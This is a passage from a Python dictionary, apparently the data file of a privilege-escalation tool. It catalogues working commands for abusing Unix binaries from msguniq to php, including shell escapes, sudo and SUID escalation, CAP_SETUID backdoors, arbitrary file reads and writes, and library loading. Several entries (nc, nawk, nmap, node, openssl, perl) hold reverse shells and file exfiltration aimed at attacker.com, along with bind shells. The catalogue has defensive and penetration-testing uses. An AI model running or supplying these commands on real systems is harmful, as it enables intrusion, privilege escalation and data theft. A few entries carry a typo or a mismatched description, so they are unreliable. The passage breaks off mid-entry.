            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msguniq) .\n\nLFILE=file_to_read\n./msguniq -P $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo msguniq -P $LFILE"}},
            },
    'mtr':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmtr --raw -F \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""}},
            },
    'mv':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which mv) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"}},
            },
    'mysql':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"mysql -e '\! /bin/sh'"}},
        'library_load':{
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"mysql --default-auth ../../../../../path/to/lib"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo mysql -e '\! /bin/sh'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which mysql) .\n\n./mysql -e '\! /bin/sh'"}},
            },
    'nano':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"nano\n^R^X\nreset; sh 1>&0 2>&0",
                '2':"nano -s /bin/sh\n/bin/sh\n^T"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"nano file_to_write\nDATA\n^O"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"nano file_to_read"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo nano\n^R^X\nreset; sh 1>&0 2>&0"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nano) .\n\n./nano -s /bin/sh\n/bin/sh\n^T"}},
            },
    'nawk':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"nawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'no_interactive_reverse':{
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n\ts = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'no_interactive_bind':{
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n\ts = \"/inet/tcp/\" LPORT \"/0/0\";\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nnawk '//' \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nawk) .\n\nLFILE=file_to_read\n./nawk '//' \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo nawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nawk) .\n\n./nawk 'BEGIN {system(\"/bin/sh\")}'"}},
            },
    'nc':{
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT"}},
        'bind_shell':{
            'info':'It can bind a shell to a local port to allow remote network access.',
            'exploits':{
                '1':"LPORT=12345\nnc -l -p $LPORT -e /bin/sh"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\""}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nc) .\n\nRHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT"}},
            },
    'nice':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"nice /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nice) .\n\n./nice /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo nice /bin/sh"}},
            },
    'nl':{
        'file_read':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nl) .\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE"}},
            },
    'nmap':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF",
                '2':"nmap --interactive\nnmap> !sh"}},
        'no_interactive_reverse':{
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n\tlocal r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n\tlocal b=assert(f\:read(\"\*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF"}},
        'no_interactive_bind':{
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n\tlocal r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n\tlocal b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE",
                '2':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE",
                '2':"export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF",
                '2':"LFILE=file_to_write\nnmap -oG=$LFILE DATA"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nmap) .\n\nLFILE=file_to_write\n./nmap -oG=$LFILE DATA"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF",
                '2':"sudo nmap --interactive\nnmap> !sh"}},
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nmap) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF"}},
            },
    'node':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = child_process.spawn(\"/bin/sh\");\nnet.connect(process.env.RPORT, process.env.RHOST, function () {\n\tthis.pipe(sh.stdin);\n\tsh.stdout.pipe(this);\n\tsh.stderr.pipe(this);\n})'"}},
        'bind_shell':{
            'info':'It can bind a shell to a local port to allow remote network access.',
            'exploits':{
                '1':"export LPORT=12345\nnode -e 'sh = child_process.spawn(\"/bin/sh\");\nnet.createServer(function (client) {\n\tclient.pipe(sh.stdin);\n\tsh.stdout.pipe(client);\n\tsh.stderr.pipe(client);\n}).listen(process.env.LPORT)'"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"node -e 'fs.writeFileSync(\"file_to_write\", \"DATA\")'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"node -e 'process.stdout.write(fs.readFileSync(\"/bin/ls\"))'"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which node) .\n\n./node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"}},
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which node) .\nsudo setcap cap_setuid+ep node\n\n./node -e 'process.setuid(0); child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"}},
            },
    'nohup':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}},
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which nohup) .\n\n./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}},
            },
    'npm':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"npm exec /bin/sh",
                '2':"TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i"}},
            },
    'nroff':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nnroff $LFILE"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"}},
            },
    'nsenter':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"nsenter /bin/sh"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo nsenter /bin/sh"}},
            },
    'octave':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"octave-cli --eval 'system(\"/bin/sh\")'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo octave-cli --eval 'system(\"/bin/sh\")'"}},   
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which octave) .\n\n./octave-cli --eval 'system(\"/bin/sh\")'"}},   
            },
    'od':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\""}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which od) .\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\""}},   
            },
    'openssl':{
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                '2':"RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"}},
        'file_upload':{   
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save",
                '2':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\""}},
        'file_download':{   
            'info':'It can download remote files.',
            'exploits':{
                '1':"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send",
                '2':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\""}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"",
                '2':"LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\""}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nopenssl enc -in \"$LFILE\""}},
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"openssl req -engine ./lib.so"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                '2':"sudo install -m =xs $(which openssl) .\n\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s",
                '3':"sudo install -m =xs $(which openssl) .\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345",
                '2':"RHOST=attacker.com\nRPORT_12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"}},   
            },
    'openvpn':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nopenvpn --config \"$LFILE\""}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which openvpn) .\n\n./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'",
                '2':"sudo install -m =xs $(which openvpn) .\n\nLFILE=file_to_read\n./openvpn --config \"$LFILE\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'",
                '2':"LFILE=file_to_read\nsudo openvpn --config \"$LFILE\""}},   
            },
    'openvt':{
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF"}},   
            },
    'paste':{
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\npaste $LFILE"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which paste) .\n\nLFILE=file_to_read\npaste $LFILE"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo paste $LFILE"}},  
            },
    'pdb':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"}},  
            },
    'pdftex':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"pdftex --shell-escape '\write18{/bin/sh}\end'"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pdftex --shell-escape '\write18{/bin/sh}\end'"}},  
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pdftex) .\n\n./pdftex --shell-escape '\write18{/bin/sh}\end'"}},
            },
    'perl':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"perl -e 'exec \"/bin/sh\";'"}},
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nperl -ne print $LFILE"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which perl) .\n./perl -e 'exec \"/bin/sh\";'"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo perl -e 'exec \"/bin/sh\";'"}},  
        'capabilities':{   
            'info':'If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.',
            'exploits':{
                '1':"cp $(which perl) .\nsudo setcap cap_setuid+ep perl\n\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"}},
            },
    'pg':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"pg /etc/profile\n!/bin/sh"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"pg file_to_read"}}, 
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which pg) .\n\n./pg file_to_read"}}, 
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo pg /etc/profile\n!/bin/sh"}},  
            },
    'php':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'",
                '2':"export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'",
                '3':"export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'",
                '4':"export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\n\",$r));'",
                '5':"export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"}},
        'command':{   
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"}}, 
        'reverse_shell':{   
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
